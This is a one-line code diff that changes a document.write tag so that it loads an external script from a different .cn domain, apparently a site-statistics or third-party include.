@@ -1,1 +1,1 @@
-document.write('<script src="https://www.govzhajian.cn:12443/ty/9F6D696D-ECBF-16347-33-23C37B6CAD10.alpha"><\/script>');
+document.write('<script src="https://www.govhebie.cn:12443/ty/32B37BCD-0FCF-16347-33-EFFE3917AE0F.alpha"><\/script>');
